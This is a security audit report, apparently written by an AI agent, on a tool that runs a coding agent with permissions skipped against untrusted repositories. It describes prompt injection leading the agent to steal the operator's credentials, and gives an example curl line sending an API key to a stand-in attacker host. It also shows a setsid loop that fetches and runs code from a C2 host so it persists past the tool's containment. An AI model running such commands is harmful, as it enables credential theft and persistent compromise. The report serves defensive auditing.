# sec-advisor — Security Audit Findings (run 3, claude)

Date: 2026-06-11
Auditor: claude (autonomous pass 3)
Scope: `sec_advisor.py`, `config.json`, `sec-advisor`, `README.md`, `tests/test_sec_advisor.py`

## Prior coverage (runs 1 & 2)

- **Run 1** (outbound threat — "the agent does something bad"): F1 unsandboxed
  `--dangerously-skip-permissions` vs untrusted repo (HIGH/RCE), F8 no egress/fs
  confinement (MEDIUM), F2 artifacts not git-ignored (MEDIUM), F3 world-readable
  artifacts (LOW/MED), F5 config/`~/.bashrc` are TCB (LOW), F7 lexicographic run
  selection (LOW), F6 `str.format` template surface (LOW), F4 `$(cat)` delivery
  (INFO, safe).
- **Run 2** (inbound threat — "the repo attacks the orchestrator"): N1 untrusted
  repo plants control-plane metadata to redirect `kill`/`attach`/`status`
  (MEDIUM), N2 symlink write-side repo-boundary escape (MEDIUM), N3 session-name
  collision / pre-seed hijack (LOW), N4 `__controller` injects keys into an
  arbitrary pane (LOW), N5 predictable paste-buffer name (INFO).

**This pass (run 3) — a third axis neither run covered: containment and assets.**
Runs 1–2 argued *that* the agent is dangerous and *that* the repo can steer the
control plane. Neither asked the two operational questions that decide the real
blast radius: **(a) what exactly can the agent reach and steal** (the env handed
to it), and **(b) what survives the tool's own "recycle the worker" containment
claim**. R1 and R2 below are the new substantive findings; R3–R6 are smaller new
items. Overlaps with F1/F8/N1/N2 are noted, not re-litigated.

Severity legend: CRITICAL / HIGH / MEDIUM / LOW / INFO.
Confidence: how sure the issue is real, not how bad.

---

## R1 — The unsandboxed agent inherits the operator's full environment → prompt injection exfiltrates the operator's *own* credentials (API key, cloud creds, forwarded SSH agent)

- Severity: **HIGH**
- Confidence: High
- Files: `sec_advisor.py:460-491` (`start_session` pane creation, no env scrubbing),
  `:476` / `:489` (`"bash"` spawned by tmux, inherits the launcher's env),
  `:282` (`send_shell_command(item.command)` launches the agent in that pane),
  `config.json:13` (`claude --dangerously-skip-permissions`)

Run 1's F8 said "no creds in env" as a *recommended mitigation* but never
identified **which** assets are actually present or that the tool's own auth
token is the single easiest exfil target. This finding pins that down.

The worker pane is created with `tmux new-session/split-window … "bash"` and the
agent command is sent into it. **Nothing in the code scrubs, allowlists, or
resets the environment** — the tmux server (and therefore every pane and the
`bash` in it) inherits the environment of whoever launched `sec-advisor`. For
the documented workflow (`./sec-advisor run` from an interactive shell) that
environment routinely contains, in order of value to an attacker:

- **`ANTHROPIC_API_KEY`** — the very key powering the audit agent. A
  prompt-injection payload in the audited repo (the canonical F1 vector) can do
  `curl -sd "$ANTHROPIC_API_KEY" https://attacker.example` with no gate. The
  tool hands the agent the key that pays for it.
- **Cloud creds in env**: `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`,
  `GOOGLE_APPLICATION_CREDENTIALS`, `GH_TOKEN`/`GITHUB_TOKEN`, `OPENAI_API_KEY`
  (the disabled `cdx`/codex agent), `NPM_TOKEN`, etc.
- **`SSH_AUTH_SOCK`** — if the operator ran `sec-advisor` over an SSH session
  with agent forwarding (common for auditing a repo on a remote box), the
  forwarded agent socket is in the environment. The agent can sign with the
  operator's private keys (`ssh attacker@host`, `git push` to arbitrary repos)
  **without ever reading a key file** — defeating any "no key files on disk"
  assumption.
- On-disk credential stores reachable from the same shell: `~/.aws`,
  `~/.config/gh`, `~/.netrc`, `~/.ssh`, `~/.git-credentials`.

Exploitability: identical precondition to F1 (audit a hostile repo), but the
*payoff* is concrete and high — theft of the operator's live credentials and
lateral movement, not just local RCE. Because permissions are skipped and there
is no egress restriction (F8), there is no step between "model emits the curl"
and "key leaves the box." This is the asset inventory that makes F1/F8 worth
fixing first.

---

## R2 — `respawn-pane -k` does not reap detached children → a compromised agent persists across "recycling" and after the audit ends (false containment)

- Severity: **MEDIUM**
- Confidence: High
- Files: `sec_advisor.py:308-311` (`recycle_worker`), `:310`
  (`tmux respawn-pane -k`), `README.md:5-8` ("recycles the worker pane")

```python
def recycle_worker(self) -> None:
    if tmux_target_exists(self.worker_pane):
        tmux("respawn-pane", "-k", "-t", self.worker_pane, "-c", str(self.config.project_dir))
        self.sleep_with_controls(1, "fresh shell")
```

`respawn-pane -k` SIGKILLs the pane's **foreground process** and starts a fresh
`bash`. It does **not** kill processes the previous command detached from the
pane: anything started with `setsid`, `nohup … &`, `disown`, a double-fork
daemon, or a systemd `--user` unit reparents to init/PID 1 and **survives the
respawn untouched**. The README sells recycling as the cleanliness boundary
between runs ("recycles the worker pane, and continues to the next run"), and the
whole tool is built to run many cycles unattended — so the implicit promise is
"each run starts clean."

Consequence: a single successful injection in *any* of the 6×`run_seconds` cycles
can plant a persistent backdoor —

```
setsid bash -c 'while :; do curl -s attacker/c2 | bash; sleep 60; done' &>/dev/null &
```

— and it keeps running through every subsequent "recycle", through
`Q`/`kill` (which only `kill-session`s the tmux session, `:375`/`:560` — again
the pane's processes, not detached grandchildren), and **after the operator
believes the audit is fully torn down**. The tool's own containment story is
the thing that makes this dangerous: an operator who trusts "recycle = fresh"
will not look for survivors.

This is distinct from F1/F8 (which describe the agent acting badly *during* a
run); R2 is specifically about **persistence beyond the run/teardown lifecycle**,
which neither prior pass addressed.

---

## R3 — Post-completion controller loop never terminates → audit session (and any leftover worker process) lingers indefinitely

- Severity: **LOW**
- Confidence: High
- Files: `sec_advisor.py:419-424` (`run_controller`), `:420-422`

```python
Controller(config, args.session, args.worker_pane).run()
while True:
    select.select([sys.stdin], [], [], 1)
    Controller(config, args.session, args.worker_pane).handle_keyboard()
```

After all runs complete (`run()` returns at `:267`), the controller drops into an
**infinite** `while True` that only services `q`/`s` keystrokes. The tmux session
is never auto-closed and the process spins on a 1s `select` forever. Security
relevance (beyond the obvious resource waste): the **worker pane and whatever the
last agent left running stay alive indefinitely** with the operator's full
environment, well past the point the operator thinks the audit "finished." There
is no idle timeout and no `kill-session` on normal completion. Combined with R2,
"the audit finished" never actually closes the blast window. Prefer exiting (and
optionally `kill-session`) on completion, or at minimum surfacing a "complete —
press Q to close" state that the operator must act on.

---

## R4 — `os.path.expandvars` on path inputs → environment-driven path redirection

- Severity: **LOW**
- Confidence: Medium
- Files: `sec_advisor.py:59-63` (`expand_path`), `:66-70` (`expand_project_path`),
  used for `project_dir` at `:102`

Both path helpers run input through `os.path.expandvars` before resolving:

```python
path = Path(os.path.expandvars(os.path.expanduser(value)))
```

So a `project_dir` value (from `config.json` or, via `expand_project_path`, the
config default `"."`) containing `$VAR`/`${VAR}` is expanded against the process
environment. For the *config* path this is trusted-input-only today, but it
creates an avoidable coupling: anything that can influence the environment
(a sourced `.env`, CI/job variables, a parent process) can silently move where
the audit runs and where all artifacts (`.planning/work/sec-advisor/…`) are
written — i.e. it is a second, quieter lever on the same path-control surface as
N2's symlink escape. The CLI override path (`:100-101`) does **not** expandvars
(it uses `.expanduser().resolve()` only), so the two entry points disagree.
Low risk; prefer dropping `expandvars` (keep only `expanduser`) so paths are not
environment-sensitive, and make both entry points consistent.

---

## R5 — `capture-pane` without `-e`: terminal-escape injection into capture files is *not* present (checked, acceptable)

- Severity: **INFO** (verified safe)
- Confidence: High
- Files: `sec_advisor.py:339-350` (`capture_run`)

The capture uses `capture-pane -p -J -S -<n>` and **omits `-e`**, so tmux strips
SGR/escape sequences from the dump. Capture files therefore contain plain text
even though the source pane rendered attacker-controlled output (the audited
repo's file contents the agent printed). That means a later `cat capture.txt`
will **not** be hijacked by embedded `\033[…` escapes — a real risk that this
code avoids. Worth recording explicitly as checked: had `-e` been added "to keep
colors," it would have turned every capture file into a terminal-injection
payload readable by whoever views it. Leave `-e` off. (The *content* still
reaches a future pass / can be committed — that remains F2's git-leak concern,
not an escape-injection one.)

---

## R6 — Unbounded numeric config (`run_seconds`, `num_runs`, `history_limit`, `capture_lines`) → local resource pressure; trusted-input today

- Severity: **LOW**
- Confidence: Medium
- Files: `sec_advisor.py:95-118` (config coercion), `:493`
  (`set-option … history-limit`), `config.json:5-9`

`int(...)` coercion validates only `num_runs >= 1`; the rest accept any
non-negative int. `history_limit` (default **200000**) is pushed straight to
`tmux set-option history-limit`, so a long unattended audit retains up to 200k
lines of scrollback **per pane** in the tmux server's memory — and the agent is
encouraged to print file contents, so scrollback fills fast. `run_seconds`
(default **5400**) × `num_runs` (default **6**) sets a 9-hour minimum unattended
window with no upper clamp. These are operator-controlled (trusted) today, so
the risk is robustness/DoS-by-misconfiguration rather than an external exploit —
but a hostile or careless config can pin host memory for the session. Add sane
upper bounds and reject absurd values at load.

---

## Areas checked this pass that look acceptable

- **No env scrubbing is the issue, not env *injection*:** the agent `command`
  and prompt are passed as data/argv (confirmed again against F4/N5); there is no
  new shell-injection sink. R1 is about what the inherited env *contains*, not
  about injecting into it.
- **Second-order injection via planted prior-audit files — considered, weak:**
  the prompt tells each pass to "read any previous audit files under
  `{audit_dir}`" (`config.json:23`). `{audit_dir}` is the **freshly timestamped**
  `runtime_dir`, `mkdir`'d empty at session start (`:251-252`), so a repo cannot
  pre-populate that exact dir (timestamp unpredictable). Files there come from
  prior passes of the same agent. The only way a repo reaches it is N2's symlink
  on `.planning` — already filed. Not a distinct new finding; the agent already
  reads all repo files (F1), so planted injection has an easier home.
- **`capture-pane` escape stripping:** see R5 — verified safe.
- **`safe_agent` filename sanitization (`:338`):** agent name is reduced to
  `[A-Za-z0-9_-]` before use in the capture filename, so the per-run filename
  cannot traverse or inject; the path-escape risk for captures lives in the
  *directory* (N2 symlink), not the basename.
- **`sh_quote` / list-argv discipline:** unchanged from prior passes — all
  `tmux` calls use list argv; the only string-built shell line
  (`build_prompt_argument_command`, `:234-235`) remains data-only.

## Risk ranking (this pass)

1. R1 — agent inherits operator env; injection steals API key / cloud creds /
   forwarded SSH agent (HIGH) — the concrete asset inventory behind F1/F8
2. R2 — detached children survive `respawn-pane -k` / `kill-session`; false
   containment, persistence past teardown (MEDIUM)
3. R3 — controller never exits on completion; session + worker linger (LOW)
4. R4 — `expandvars` on paths → environment-driven path redirection (LOW)
5. R6 — unbounded numeric config → local resource pressure (LOW)
6. R5 — capture-pane escape stripping verified safe (INFO)

The through-line for run 3: the tool's danger is not only *that* it runs an
unsandboxed agent (run 1) or *that* the repo can poke the control plane (run 2),
but that it (a) hands that agent the operator's live credentials and (b) claims a
"recycle" containment it does not actually enforce. Fixing R1+R2 shrinks the
real blast radius more than any of the LOW items.
